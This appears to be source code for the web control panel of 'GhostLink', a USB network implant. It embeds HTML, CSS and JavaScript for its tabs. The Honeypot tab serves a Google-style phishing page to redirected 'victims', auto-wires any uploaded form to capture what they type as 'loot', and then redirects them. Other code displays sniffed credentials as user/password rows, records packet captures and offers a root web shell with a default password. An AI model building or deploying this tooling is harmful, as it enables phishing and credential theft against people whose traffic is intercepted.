            (REDIRECT_FROM / WEBSITE_VISIT rule) resolves there via dnsmasq.
          </div>
        </div>
        <div class="flex-row" style="gap:8px; align-items:flex-end;">
          <div>
            <div class="dim" style="font-size:12px;">IP</div>
            <input id="hpIp" type="text" placeholder="172.32.0.254" style="width:140px; font-family: ui-monospace, Menlo, monospace;">
          </div>
          <button class="btn-ghost" onclick="hpSaveIp()">Save IP</button>
        </div>
      </div>
    </div>

    <div class="section">
      <h4>Status</h4>
      <div class="flex-row" style="justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
        <div style="flex:1 1 260px;">
          <div class="dim" style="font-size:12px;">
            When a victim's browser requests any host in <code>REDIRECT_FROM</code>
            (or any host from a <code>WEBSITE_VISIT=</code> rule), the device
            serves the honeypot page instead of 302-ing. Everything they type
            into the form gets captured, logged red in Live, and the victim
            is redirected to <code>HONEYPOT_REDIRECT_AFTER</code> (or a
            <code>SIGN_IN REDIRECT_TO</code> rule, if set).
          </div>
        </div>
        <div class="flex-row" style="gap:10px; align-items:center;">
          <span>Enable</span>
          <label class="sw">
            <input type="checkbox" id="hpEnable" data-k="HONEYPOT">
            <span class="slider"></span>
          </label>
          <span id="hpState" class="status-badge">OFF</span>
        </div>
      </div>
      <div class="stat-grid" style="margin-top:10px;">
        <div class="stat"><label>loot captured</label>  <div class="val match" id="hpLoot">0</div></div>
        <div class="stat"><label>custom html</label>    <div class="val"       id="hpCustom">no</div></div>
        <div class="stat"><label>rules</label>          <div class="val"       id="hpRules">0</div></div>
        <div class="stat"><label>trap hosts</label>     <div class="val"       id="hpHosts">0</div></div>
        <div class="stat"><label>IP on usb0</label>     <div class="val"       id="hpIpBound">no</div></div>
      </div>
    </div>

    <div class="section">
      <h4>Behavior</h4>
      <div class="cfg-row">
        <label>Redirect after sign-in</label>
        <input id="hpAfter" type="text" placeholder="https://google.com (or empty = bounce victim back to original host)">
      </div>
      <div class="cfg-row">
        <label>Rules (DSL — one per line)</label>
        <textarea id="hpRulesTxt" rows="4" spellcheck="false"
                  placeholder="ON SIGN_IN REDIRECT_TO https://google.com&#10;ON WEBSITE_VISIT=google.com REDIRECT_HONEYPOT"></textarea>
      </div>
      <div class="dim" style="font-size:11px; margin:4px 0 10px;">
        Supported rules — rough grammar, forgiving about spaces/equals/commas:<br>
        &nbsp;&nbsp;<code>ON SIGN_IN REDIRECT_TO &lt;url&gt;</code>
        &nbsp;&middot;&nbsp;
        <code>ON WEBSITE_VISIT=&lt;host&gt; REDIRECT_HONEYPOT</code>
      </div>
      <div class="flex-row" style="gap:8px;">
        <button class="btn-primary" onclick="hpSaveBehavior()">Save behavior</button>
        <button class="btn-ghost"   onclick="hpReload()">Reload</button>
      </div>
    </div>

    <div class="section">
      <h4>Custom index.html</h4>
      <div class="dim" style="font-size:12px; margin-bottom:8px;">
        Upload your own full HTML page. Any <code>&lt;form&gt;</code> on the page
        is auto-wired: every field submits to <code>/_honeypot_submit</code>
        — no need to edit the page's markup. Leave empty to use the bundled
        Google-style default.
      </div>
      <textarea id="hpHtml" rows="12" spellcheck="false"
                style="font-family: ui-monospace, Menlo, monospace; font-size:12px;"></textarea>
      <div class="flex-row" style="gap:8px; margin-top:8px;">
        <button class="btn-primary"  onclick="hpSaveHtml()">Save HTML</button>
        <button class="btn-ghost"    onclick="hpResetHtml()">Reset to bundled</button>
        <button class="btn-ghost"    onclick="hpPreview()">Preview</button>
      </div>
    </div>

    <div class="section">
      <div class="flex-row" style="justify-content:space-between; align-items:center;">
        <h4>Captured loot</h4>
        <div class="flex-row" style="gap:8px;">
          <button class="btn-ghost" onclick="hpReloadLoot()">Refresh</button>
          <button class="btn-ghost" onclick="hpClearLoot()">Clear</button>
        </div>
      </div>
      <div class="table-wrap">
        <table class="t-verdicts">
          <thead><tr><th>time</th><th>ip</th><th>host</th><th>fields</th><th>ua</th></tr></thead>
          <tbody id="hpLootBody"><tr><td colspan="5" class="dim">no captures yet</td></tr></tbody>
        </table>
      </div>
    </div>
  </section>

  <!-- =========== TERMINAL (Web CLI) =========== -->
  <section id="tab-Terminal" class="tabcontent">
    <h3>Terminal <span class="dim" style="font-size:12px;">(web shell)</span></h3>
    <div id="termLogin" class="section">
      <h4>Login required</h4>
      <p class="dim" style="font-size:13px;">
        Session is HttpOnly, 1h sliding, local only. User + pass are set in
        <code>config.txt</code> (<code>WEBUI_USER</code> / <code>WEBUI_PASS</code>).
        Default: <code>root / ghostlink</code> — <b>change them</b>.
      </p>
      <div class="setting-row flex-row" style="gap:8px;">
        <input type="text" id="loginUser" placeholder="user" style="min-width:120px;">
        <input type="password" id="loginPass" placeholder="password" style="min-width:160px;">
        <button onclick="cliLogin()">Login</button>
        <span id="loginMsg" class="dim" style="font-size:12px;"></span>
      </div>
    </div>
    <div id="termView" class="section" style="display:none;">
      <div class="flex-row" style="justify-content:space-between;">
        <h4>shell &middot; <span id="termUser" class="dim" style="font-weight:400;"></span></h4>
        <div class="flex-row" style="gap:8px;">
          <button onclick="cliReset()" class="btn-ghost">Reset shell</button>
          <button onclick="cliLogout()" class="btn-ghost">Logout</button>
        </div>
      </div>
      <!-- xterm.js attaches here. Full keyboard: ctrl-c, tab, arrows,
           history, scrollback, ANSI colors — everything a real terminal
           has. Bytes stream over SSE / POST, no WebSocket needed. -->
      <div id="xtermHost" style="height:460px; background:#000; padding:8px; border-radius:6px; border:1px solid var(--glass-border);"></div>
      <div class="dim" style="font-size:11px; margin-top:6px;">
        real pty-backed shell &middot; cwd / env / vars persist &middot;
        try <code>vi /tmp/x</code>, <code>top</code>, <code>cd /root/ghostlink</code>
      </div>
    </div>
  </section>

  <!-- =========== SYSTEM =========== -->
  <section id="tab-System" class="tabcontent">
    <h3>System</h3>
    <div class="section">
      <h4>DHCP Leases <span class="dim">(dnsmasq)</span></h4>
      <div class="table-wrap">
        <table class="t-ifaces">
          <thead><tr><th>expires</th><th>mac</th><th>ipv4</th><th>hostname</th><th>id</th></tr></thead>
          <tbody id="leases-body"><tr><td colspan="5" class="dim">&hellip;</td></tr></tbody>
        </table>
      </div>
    </div>
    <div class="section">
      <h4>ghostlink.log <span class="dim">(tail)</span></h4>
      <pre id="log" class="log-pane"></pre>
    </div>
    <div class="section">
      <h4>Danger</h4>
      <button class="danger" onclick="reboot()">Reboot Device</button>
    </div>
  </section>

</div>

<script src="/app.js"></script>
</body></html>
"""

# ====== CSS =================================================================
# Ported from QWavey/ESP-S3-Key-BadUSB stylesheet so GhostLink reads as part
# of the same stack. Material green primary, dark glass, radial-green glow,
# h3 with green left-border, pill tab bar, gradient green buttons.

CSS = r""":root {
  --primary: #4CAF50;
  --primary-hover: #45a049;
  --primary-dim: #3d8b40;
  --bg-dark: #0f0f0f;
  --bg-card: rgba(45, 45, 45, 0.7);
  --bg-section: rgba(61, 61, 61, 0.5);
  --bg-input: #1a1a1a;
  --text-main: #ffffff;
  --text-muted: #b0b0b0;
  --danger: #f44336;
  --danger-hover: #d32f2f;
  --glass-border: rgba(255, 255, 255, 0.1);
  --shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
}

* { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }

html, body { overflow-x: hidden; max-width: 100%; }

body {
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  background-color: var(--bg-dark);
  background-image:
    radial-gradient(circle at 20% 30%, rgba(76, 175, 80, 0.05) 0%, transparent 40%),
    radial-gradient(circle at 80% 70%, rgba(76, 175, 80, 0.05) 0%, transparent 40%);
  color: var(--text-main);
  line-height: 1.6;
  min-height: 100vh;
  padding: 20px;
}

.container {
  width: 100%;
  max-width: 1100px;
  min-width: 0;
  margin: 0 auto;
  background: var(--bg-card);
  backdrop-filter: blur(12px);
  -webkit-backdrop-filter: blur(12px);
  border: 1px solid var(--glass-border);
  border-radius: 20px;
  padding: 30px;
  box-shadow: var(--shadow);
  position: relative;
}

h1 {
  color: var(--primary);
  text-align: center;
  margin-bottom: 4px;
  font-weight: 700;
  letter-spacing: -1px;
  text-transform: uppercase;
}
.subtitle {
  text-align: center;
  color: var(--text-muted);
  font-size: 13px;
  margin-bottom: 24px;
}

h3 {
  margin-bottom: 10px;
  font-weight: 600;
  color: var(--text-main);
  border-left: 4px solid var(--primary);
  padding-left: 15px;
}
h4 {
  margin: 15px 0 10px;
  font-weight: 500;
  color: var(--primary);
}

/* Tabs */
.tab {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  background: rgba(0, 0, 0, 0.2);
  padding: 8px;
  border-radius: 12px;
  margin-bottom: 25px;
}
.tablinks {
  flex: 1;
  min-width: 100px;
  background: transparent;
  border: none;
  padding: 10px 15px;
  cursor: pointer;
  transition: all 0.2s ease;
  color: var(--text-muted);
  font-weight: 500;
  border-radius: 8px;
  font-size: 14px;
}
.tablinks:hover { background: rgba(255, 255, 255, 0.05); color: var(--text-main); }
.tablinks.active { background: var(--primary); color: white; }

.tabcontent { display: none; animation: slideIn 0.3s ease-out; }
@keyframes slideIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }

.section, .setting-group {
  margin: 20px 0;
  padding: 20px;
  background: var(--bg-section);
  border-radius: 12px;
  border: 1px solid var(--glass-border);
}

.flex-row { display: flex; flex-direction: row; align-items: center; }
.flex-grow { flex-grow: 1; }

/* Status badge (REC indicator) */
.status-badge {
  padding: 6px 12px;
  background: rgba(0,0,0,0.3);
  border: 1px solid var(--glass-border);
  border-radius: 20px;
  font-size: 12px;
  color: var(--text-muted);
  font-weight: 600;
  letter-spacing: 1px;
}
.status-badge.on {
  color: var(--primary);
  border-color: var(--primary);
  background: rgba(76, 175, 80, 0.12);
}

/* Disk pressure banner. Soft on L1 (warn), loud on L2 (emergency). */
.warn-banner {
  margin: 0 0 16px;
  padding: 12px 18px;
  border-radius: 10px;
  font-size: 13px;
  border: 1px solid var(--glass-border);
}
.warn-banner.l1 {
  background: rgba(255, 193, 7, 0.08);
  border-left: 4px solid #ffc107;
  color: #ffc107;
}
.warn-banner.l2 {
  background: rgba(244, 67, 54, 0.12);
  border-left: 4px solid var(--danger);
  color: var(--danger);
  font-weight: 600;
  animation: pulseWarn 2s ease-in-out infinite;
}
@keyframes pulseWarn { 50% { background: rgba(244, 67, 54, 0.22); } }

/* Stats grid (big-number tiles are OK here — this is a monitor pane) */
.stat-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
  gap: 12px;
  margin: 18px 0 10px;
}
.stat {
  background: var(--bg-section);
  border: 1px solid var(--glass-border);
  border-radius: 12px;
  padding: 14px 16px;
}
.stat label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.6px; }
.stat .val { font-size: 24px; font-weight: 700; color: var(--text-main); margin-top: 4px; font-variant-numeric: tabular-nums; }
.stat .val.match { color: var(--primary); }

/* Form controls */
input[type="text"], input[type="password"], input[type="number"], select, textarea {
  background: var(--bg-input);
  color: var(--text-main);
  border: 1px solid var(--glass-border);
  padding: 10px 14px;
  border-radius: 8px;
  outline: none;
  font: inherit;
  transition: border-color 0.2s;
}
input:focus, textarea:focus, select:focus { border-color: var(--primary); }
textarea { font-family: 'Fira Code', 'Consolas', 'Courier New', monospace; font-size: 13px; line-height: 1.5; white-space: pre; }
input { min-width: 180px; }

button {
  background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dim) 100%);
  color: white;
  padding: 10px 20px;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  font-weight: 600;
  font-size: 14px;
  transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
  display: inline-flex;
  align-items: center;
  justify-content: center;
  font-family: inherit;
}
button:hover { transform: translateY(-1px); filter: brightness(1.1); }
button:active { transform: translateY(0); }
button.danger { background: linear-gradient(135deg, var(--danger) 0%, #c62828 100%); }
button.danger:hover { filter: brightness(1.08); }
button.ghost {
  background: transparent;
  border: 1px solid var(--glass-border);
  color: var(--text-main);
}
button.ghost:hover { border-color: var(--primary); color: var(--primary); transform: none; filter: none; }

code {
  background: rgba(0, 0, 0, 0.4);
  color: var(--primary);
  padding: 2px 6px;
  border-radius: 4px;
  font-family: 'Fira Code', 'Consolas', monospace;
  font-size: 0.92em;
}

.dim { color: var(--text-muted); }
.setting-row { gap: 10px; flex-wrap: wrap; }

/* Tables */
.table-wrap {
  overflow-x: auto;
  background: rgba(0,0,0,0.25);
  border-radius: 10px;
  border: 1px solid var(--glass-border);
}
table { width: 100%; border-collapse: collapse; font-size: 13px; }
th, td {
  padding: 10px 12px;
  text-align: left;
  border-bottom: 1px solid rgba(255,255,255,0.06);
  white-space: nowrap;
  font-variant-numeric: tabular-nums;
}
th { color: var(--primary); font-weight: 600; font-size: 11px; text-transform: uppercase; letter-spacing: 0.6px; }
tr:last-child td { border-bottom: none; }
tbody tr:hover { background: rgba(76,175,80,0.05); }
.t-verdicts td.rule-REDIRECT { color: var(--primary); font-weight: 600; }
.t-verdicts td.rule-DNS      { color: var(--text-main); }
.t-verdicts tr.cred, .t-verdicts td.rule-CRED {
  color: var(--danger) !important;
  font-weight: 700;
}
.t-verdicts tr.cred { background: rgba(244, 67, 54, 0.08); }
.t-verdicts tr.cred:hover { background: rgba(244, 67, 54, 0.14); }

/* Segmented mode toggle on the Live pane */
.seg-btn {
  background: var(--bg-input);
  color: var(--text-muted);
  border: 1px solid var(--glass-border);
  padding: 8px 14px;
  font-weight: 500;
  font-size: 13px;
  border-radius: 0;
  transition: all 0.15s;
}
.seg-btn:hover { color: var(--text-main); transform: none; filter: none; }
.seg-left  { border-radius: 8px 0 0 8px; border-right: none; }
.seg-right { border-radius: 0 8px 8px 0; }
.seg-btn.active {
  background: var(--primary);
  color: #fff;
  border-color: var(--primary);
}
.seg-btn:disabled {
  opacity: 0.4;
  cursor: not-allowed;
}
.link-badge {
  padding: 3px 10px;
  border-radius: 999px;
  background: rgba(125, 133, 144, 0.12);
  color: var(--text-muted);
  font-size: 11px;
  font-family: 'Fira Code','Consolas',monospace;
  border: 1px solid transparent;
}
.link-badge.up {
  background: rgba(76, 175, 80, 0.14);
  color: var(--primary);
  border-color: rgba(76, 175, 80, 0.4);
}
.link-badge.down {
  background: rgba(125, 133, 144, 0.08);
}
td.name a, td a { color: var(--primary); text-decoration: none; }
td a:hover { text-decoration: underline; }
td.actions { display: flex; gap: 8px; }
td.actions a { font-size: 12px; }

.file-list { list-style: none; }
.file-list li {
  padding: 10px 14px;
  background: var(--bg-input);
  border: 1px solid var(--glass-border);
  border-radius: 8px;
  margin-bottom: 8px;
  cursor: pointer;
  transition: all 0.15s;
  font-family: 'Fira Code', 'Consolas', monospace;
  font-size: 13px;
}
.file-list li:hover { border-color: var(--primary); color: var(--primary); }

.log-pane {
  background: #000;
  color: var(--text-main);
  padding: 14px;
  border-radius: 8px;
  border: 1px solid var(--glass-border);
  font-family: 'Fira Code', 'Consolas', monospace;
  font-size: 12px;
  max-height: 320px;
  overflow: auto;
  white-space: pre-wrap;
}

/* Toasts */
.toast {
  position: fixed;
  top: 20px; right: 20px;
  padding: 12px 18px;
  background: var(--bg-card);
  border: 1px solid var(--glass-border);
  border-left: 4px solid var(--primary);
  border-radius: 10px;
  color: var(--text-main);
  box-shadow: var(--shadow);
  z-index: 9999;
  font-size: 14px;
  animation: slideIn 0.2s;
}
.toast.err { border-left-color: var(--danger); }

/* Mobile */
/* ---- IDE (Scripting pane) ---------------------------------------------- */
.ide-grid {
  display: grid;
  grid-template-columns: minmax(220px, 280px) 1fr;
  gap: 14px;
  margin: 16px 0 0;
  align-items: start;
}
.ide-side {
  min-width: 0;
  max-height: calc(100vh - 240px);
  overflow-y: auto;
  padding-right: 4px;
}
.ide-side .section {
  margin: 0 0 10px !important;
  padding: 12px 14px !important;
}
.ide-side .section h4 { margin: 0 0 8px; font-size: 13px; }
.ide-side ul.file-list { max-height: 240px; overflow-y: auto; }
.ide-side ul.file-list li {
  padding: 6px 10px;
  margin-bottom: 4px;
  font-size: 12px;
}
.ide-main {
  min-width: 0;
  display: flex;
  flex-direction: column;
  gap: 0;
}
.editor-wrapper { min-height: calc(100vh - 320px); }
.editor-wrapper textarea { min-height: calc(100vh - 320px); }

.editor-toolbar {
  gap: 8px;
  padding: 10px 14px;
  background: var(--bg-section);
  border: 1px solid var(--glass-border);
  border-radius: 10px 10px 0 0;
}
.editor-toolbar #editorTitle { font-family: 'Fira Code','Consolas',monospace; }
button.btn-run   { background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dim) 100%); }
button.btn-save  { background: linear-gradient(135deg, #4a90e2 0%, #2d6fbe 100%); }
button.btn-ghost {
  background: transparent;
  border: 1px solid var(--glass-border);
  color: var(--text-main);
}
button.btn-ghost:hover { border-color: var(--primary); color: var(--primary); transform: none; filter: none; }

.editor-wrapper {
  display: flex;
  background: #0b0e13;
  border: 1px solid var(--glass-border);
  border-top: none;
  border-radius: 0;
  min-height: 440px;
  position: relative;
}
.editor-gutter {
  width: 44px;
  background: rgba(255,255,255,0.03);
  border-right: 1px solid var(--glass-border);
  color: var(--text-muted);
  font-family: 'Fira Code','Consolas',monospace;
  font-size: 13px;
  padding: 12px 6px 12px 0;
  text-align: right;
  user-select: none;
  line-height: 20px;
  white-space: pre;
  overflow: hidden;
}
.editor-wrapper textarea {
  flex-grow: 1;
  background: transparent;
  color: var(--text-main);
  border: none;
  padding: 12px 14px;
  margin: 0;
  font-family: 'Fira Code','Consolas',monospace;
  font-size: 13px;
  line-height: 20px;
  resize: vertical;
  outline: none;
  min-height: 440px;
  tab-size: 2;
  white-space: pre;
  overflow: auto;
}
.editor-wrapper textarea:focus { border: none; outline: none; }
.editor-foot {
  padding: 8px 14px;
  background: var(--bg-section);
  border: 1px solid var(--glass-border);
  border-top: none;
  border-radius: 0 0 10px 10px;
  font-size: 12px;
  color: var(--text-muted);
}
.editor-foot .err { color: var(--danger); }
.autocomplete-popup {
  position: absolute;
  display: none;
  background: #141a20;
  border: 1px solid var(--primary);
  border-radius: 6px;
  padding: 4px 0;
  min-width: 220px;
  max-height: 240px;
  overflow-y: auto;
  z-index: 50;
  font-family: 'Fira Code','Consolas',monospace;
  font-size: 13px;
  box-shadow: var(--shadow);
}
.autocomplete-popup .ac-item {
  padding: 5px 12px;
  cursor: pointer;
  color: var(--text-main);
  display: flex;
  gap: 10px;
}
.autocomplete-popup .ac-item .ac-kind {
  color: var(--text-muted);
  font-size: 11px;
  margin-left: auto;
}
.autocomplete-popup .ac-item.selected,
.autocomplete-popup .ac-item:hover {
  background: var(--primary);
  color: #000;
}
.autocomplete-popup .ac-item.selected .ac-kind,
.autocomplete-popup .ac-item:hover .ac-kind { color: #000; }

ul.file-list li.active {
  background: rgba(76,175,80,0.1);
  border-color: var(--primary);
  color: var(--primary);
}
ul.file-list li .fl-size {
  color: var(--text-muted);
  font-size: 10px;
  margin-left: 10px;
}
ul.file-list li .fl-del {
  float: right;
  color: var(--danger);
  cursor: pointer;
  opacity: 0.5;
  margin-left: 6px;
}
ul.file-list li:hover .fl-del { opacity: 1; }

/* ---- real toggle switches (ESP-S3-DevKitC-BadUSB style) --------------- */
/* Every form boolean renders as .sw > input + .slider so the UI is a
   row of actual toggle switches instead of raw browser checkboxes. */
label.sw {
  position: relative;
  display: inline-block;
  width: 46px;
  height: 24px;
  vertical-align: middle;
  cursor: pointer;
  user-select: none;
}
label.sw input { opacity: 0; width: 0; height: 0; }
label.sw .slider {
  position: absolute;
  cursor: pointer;
  top: 0; left: 0; right: 0; bottom: 0;
  background-color: #444;
  transition: .25s;
  border-radius: 34px;
}
label.sw .slider:before {
  position: absolute;
  content: "";
  height: 18px; width: 18px;
  left: 3px; bottom: 3px;
  background-color: white;
  transition: .25s;
  border-radius: 50%;
}
label.sw input:checked + .slider { background-color: var(--primary); }
label.sw input:checked + .slider:before { transform: translateX(22px); }

/* a .sw-inline wrapper lets us put label + switch on one row (used in Live
   pane and the inline Live-Typing toggle where we want the text left and
   the switch right). */
.sw-inline {
  display: inline-flex;
  align-items: center;
  gap: 10px;
}
.sw-inline > label.sw { flex: 0 0 46px; }

/* ---- Config form grid -------------------------------------------------- */
.cfg-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
  gap: 10px 20px;
}
.cfg-row {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 6px 0;
}
.cfg-row label:first-child {
  flex: 0 0 150px;
  color: var(--text-muted);
  font-size: 13px;
}
.cfg-row input[type="text"], .cfg-row input[type="password"], .cfg-row input[type="number"], .cfg-row input:not([type]) {
  flex: 1;
  min-width: 0;
  font-family: 'Fira Code','Consolas',monospace;
  font-size: 12px;
  padding: 6px 10px;
}
.cfg-row.sw-row label:first-child { flex: 0 0 150px; }
.cfg-row.sw-row .sw { flex: 0 0 auto; }
.cfg-row.sw-row .dim { font-family: inherit; }

/* ---- Terminal pane ----------------------------------------------------- */
#termOut {
  background: #000;
  color: #c3e3bd;
  font-family: 'Fira Code','Consolas',monospace;
  font-size: 13px;
  overflow-x: auto;
}
#termOut .cmd  { color: var(--primary); }
#termOut .err  { color: var(--danger); }
#termOut .rc0  { color: var(--text-muted); font-size: 11px; }
#termOut .rc1  { color: var(--danger);     font-size: 11px; }

@media (max-width: 1000px) {
  .ide-grid { grid-template-columns: 1fr; }
  .ide-side { order: 2; }
}

@media (max-width: 760px) {
  body { padding: 12px; }
  .container { padding: 18px; border-radius: 14px; }
  h1 { font-size: 22px; }
  .tab { gap: 4px; padding: 6px; }
  .tablinks { min-width: 70px; font-size: 12px; padding: 8px 10px; }
  .section, .setting-group { padding: 14px; }
  .stat .val { font-size: 20px; }
  table { font-size: 12px; }
}
"""

# ====== JS ==================================================================
JS = r"""
const $ = s => document.querySelector(s);
const $$ = s => document.querySelectorAll(s);
const esc = s => String(s ?? '').replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));

function fmtBytes(n) {
  if (n == null) return '-';
  const u = ['B','K','M','G']; let i = 0;
  while (n >= 1024 && i < u.length-1) { n /= 1024; i++; }
  return (i === 0 ? n : n.toFixed(1)) + u[i];
}
function fmtTime(ts) {
  const d = new Date(ts * 1000); const p = n => String(n).padStart(2,'0');
  return `${d.getFullYear()}-${p(d.getMonth()+1)}-${p(d.getDate())} ${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
}

async function api(path, opts) {
  const r = await fetch(path, opts || {});
  const t = await r.text();
  try { return JSON.parse(t); } catch { return t; }
}

function openTab(name) {
  $$('.tabcontent').forEach(el => el.style.display = 'none');
  const el = $('#tab-' + name); if (el) el.style.display = 'block';
  $$('.tablinks').forEach(b => b.classList.toggle('active', b.dataset.tab === name));
  location.hash = name;
  if (name === 'Records')   refreshRecords();
  if (name === 'System')    refreshSystem();
  // Config tab: always refetch so changes made via other tabs
  // (quick-spoof, DuckyScript GL_SET, external edits) are visible
  if (name === 'Config')    { loadCfg(); }
  if (name === 'Scripting') { scriptsRefresh(); extsRefresh(); layoutsRefresh(); }
  if (name === 'LiveType')  { $('#liveInput').focus(); }
  if (name === 'Clone')     { idRefresh(); hostsRefresh(); netProbe(); }
  if (name === 'Honeypot')  { hpReload(); hpReloadLoot(); }
  if (name === 'Terminal')  { cliProbe(); setTimeout(() => $('#termIn') && $('#termIn').focus(), 50); }
}

/* --- live tick ------------------------------------------------- */
async function tick() {
  try {
    const [st, live] = await Promise.all([api('/api/status'), api('/api/live')]);
    const b = $('#recBadge');
    const btn = $('#btnRec');
    if (st.record_pcap) {
      b.classList.add('on'); b.textContent = 'REC ON';
      if (btn) btn.textContent = 'Stop recording';
    } else {
      b.classList.remove('on'); b.textContent = 'REC OFF';
      if (btn) btn.textContent = 'Start recording';
    }
    const btnS = $('#btnStream');
    if (btnS) btnS.textContent = st.verdict ? 'Stop streaming' : 'Start streaming';
    $('#s-pps').textContent     = live.pps ?? 0;
    $('#s-mps').textContent     = live.mps ?? 0;
    $('#s-frames').textContent  = (live.frames ?? 0).toLocaleString();
    $('#s-matches').textContent = (live.matches ?? 0).toLocaleString();
    $('#s-disk').textContent    = (live.free_mb ?? st.free_mb) + ' MB';
    $('#s-uptime').textContent  = st.uptime || '-';

    // disk pressure banner
    const wb = $('#warnBanner');
    const lvl = live.warn_level || 0;
    if (lvl === 0) { wb.style.display = 'none'; wb.className = 'warn-banner'; }
    else {
      wb.style.display = 'block';
      wb.className = 'warn-banner l' + lvl;
      const fm = live.free_mb;
      wb.textContent = lvl === 2
        ? `⚠ EMERGENCY — free disk ${fm} MB (< ${live.crit_free_mb} MB). Writes paused, records and verdicts wiped.`
        : `⚠ LOW DISK — free disk ${fm} MB (< ${live.warn_free_mb} MB). Pruning oldest records to avoid a crash.`;
    }

    const vb = $('#verdicts-body');
    if (live.tail && live.tail.length) {
      vb.innerHTML = live.tail.slice().reverse().map(v => {
        const rule = v.rule || '';
        const isCred = rule === 'CRED';
        const detail = v.host || v.detail || v.kind || '';
        const extra  = v.kind && v.host ? ` [${esc(v.kind)}]` : '';
        const vdstr  = isCred
          ? `${esc(v.kind || 'CRED')} ${v.user ? 'user='+esc(v.user)+' ' : ''}${v.value ? 'pw='+esc(v.value) : ''}`
          : esc(detail) + esc(extra);
        return `<tr class="${isCred ? 'cred' : ''}">
          <td>${v.f ?? ''}</td>
          <td>${esc((v.t||'').split('.')[0])}</td>
          <td>${esc(v.flow || '')}</td>
          <td>${v.sz ?? ''}</td>
          <td class="rule-${rule}">${esc(rule)}</td>
          <td>${vdstr}</td>
        </tr>`;
      }).join('');
    }

    const ib = $('#ifaces-body');
    if (live.ifaces && live.ifaces.length) {
      ib.innerHTML = live.ifaces.map(i => `<tr>
        <td>${esc(i.name)}</td><td>${esc(i.state)}</td>
        <td>${esc(i.ipv4 || '-')}</td><td>${esc(i.mac || '-')}</td>
        <td>${(i.rx_p||0).toLocaleString()}</td>
        <td>${fmtBytes(i.rx_b)}</td>
        <td>${(i.tx_p||0).toLocaleString()}</td>
        <td>${fmtBytes(i.tx_b)}</td>
      </tr>`).join('');
    }
  } catch (e) {}
}

/* --- records --------------------------------------------------- */
async function refreshRecords() {
  const l = await api('/api/records');
  const b = $('#records-body');
  if (!Array.isArray(l) || !l.length) {
    b.innerHTML = '<tr><td colspan="4" class="dim">no files</td></tr>';
    $('#rec-summary').textContent = '0 files, 0 B'; return;
  }
  l.sort((a,b) => b.mtime - a.mtime);
  const total = l.reduce((s,f) => s + f.size, 0);
  $('#rec-summary').textContent = `${l.length} files, ${fmtBytes(total)}`;
  b.innerHTML = l.map(f => `<tr>
    <td class="name"><code>${esc(f.name)}</code></td>
    <td>${fmtBytes(f.size)}</td>
    <td>${fmtTime(f.mtime)}</td>
    <td><a href="/api/download/${encodeURIComponent(f.name)}" download>download</a>
        &nbsp;&middot;&nbsp;
        <a href="#" onclick="delRec('${f.name}');return false">delete</a></td>
  </tr>`).join('');
}
async function delRec(name) {
  if (!confirm('delete ' + name + ' ?')) return;
  await api('/api/delete', { method:'POST', body: JSON.stringify({name}) });
  refreshRecords();
}
async function clearAll() {
  if (!confirm('nuke ALL records + verdicts? cannot be undone.')) return;
  await api('/api/clear', { method:'POST' });
  refreshRecords();
}

/* --- query ---------------------------------------------------- */
function qCreds() {
  $('#q-host').value = '';
  $('#q-rule').value = 'CRED';
  runQuery();
}

async function runQuery() {
  const qs = new URLSearchParams();
  if ($('#q-host').value) qs.set('host', $('#q-host').value);
  if ($('#q-rule').value) qs.set('rule', $('#q-rule').value);
  const r = await fetch('/api/query?' + qs);
  const lines = (await r.text()).trim().split('\n').filter(Boolean);
  $('#q-result-rule').textContent =
    `${lines.length} match${lines.length === 1 ? '' : 'es'}` +
    ($('#q-host').value ? ` for host~"${$('#q-host').value}"` : '') +
    ($('#q-rule').value ? ` rule=${$('#q-rule').value}` : '');
  const b = $('#query-body');
  if (!lines.length) { b.innerHTML = '<tr><td colspan="6" class="dim">no matches</td></tr>'; return; }
  b.innerHTML = lines.slice(0, 500).map(l => {
    let v = {}; try { v = JSON.parse(l); } catch {}
    const rule = v.rule || '';
    const isCred = rule === 'CRED';
    const detail = v.host || v.detail || v.kind || '';
    const vdstr  = isCred
      ? `${esc(v.kind || 'CRED')} ${v.user ? 'user='+esc(v.user)+' ' : ''}${v.value ? 'pw='+esc(v.value) : ''}`
      : esc(detail);
    return `<tr class="${isCred ? 'cred' : ''}">
      <td>${v.f ?? ''}</td>
      <td>${esc((v.t||'').split('.')[0])}</td>
      <td>${esc(v.flow || '')}</td>
      <td>${v.sz ?? ''}</td>
      <td class="rule-${rule}">${esc(rule)}</td>
      <td>${vdstr}</td>
    </tr>`;
  }).join('');
}

/* --- config: form + raw ---------------------------------------- */
let CFG_RAW = '';     // last known raw text; preserves comments + unknown keys

function cfgParse(txt) {
  const d = {};
  (txt || '').split('\n').forEach(ln => {
    const s = ln.trim();
    if (!s || s.startsWith('#') || !s.includes('=')) return;
    const i = s.indexOf('=');
    const k = s.slice(0, i).trim();
    let v = s.slice(i + 1);
    // Only strip `#` when preceded by whitespace, so passwords / URLs that
    // happen to contain '#' aren't silently truncated.
    const m = v.match(/\s#/);
    if (m) v = v.slice(0, m.index);
    d[k] = v.trim();
  });
  return d;
}
function cfgTruthy(v) { return /^(TRUE|YES|ON|1)$/i.test(v || ''); }
async function cfgReload() {
  const t = await api('/api/config');
  CFG_RAW = typeof t === 'string' ? t : '';
  $('#cfg').value = CFG_RAW;
  const d = cfgParse(CFG_RAW);
  $$('[data-k]').forEach(el => {
    const k = el.dataset.k;
    if (el.type === 'checkbox') {
      // LIVESAVE defaults to ON when unset
      el.checked = (k === 'LIVESAVE' && d[k] == null) ? true : cfgTruthy(d[k]);
